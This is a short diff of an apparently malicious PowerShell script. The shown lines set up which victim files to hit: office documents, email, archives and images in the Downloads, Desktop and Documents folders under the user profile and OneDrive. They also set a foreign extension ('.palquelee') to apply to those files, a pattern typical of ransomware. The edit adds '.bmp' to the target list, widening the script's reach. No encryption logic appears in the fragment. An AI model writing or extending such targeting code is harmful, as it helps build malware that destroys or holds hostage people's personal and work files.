@@ -1,4 +1,4 @@
-$ext = @(".doc", ".docx", ".xls", ".xlsx", ".csv", ".ppt", ".pptx", ".msg", ".eml", ".pdf", ".txt", ".bat", ".com", ".zip", ".rar", ".7z", ".jpg", ".jpeg", ".png", ".gif", ".svg");
+$ext = @(".doc", ".docx", ".xls", ".xlsx", ".csv", ".ppt", ".pptx", ".msg", ".eml", ".pdf", ".txt", ".bat", ".com", ".zip", ".rar", ".7z", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".svg");
 $final_ext = ".palquelee"
 $user_dirs = "(Downloads|Desktop|Documents)";
 $base_dirs = @("$Env:USERPROFILE", "$Env:OneDrive");
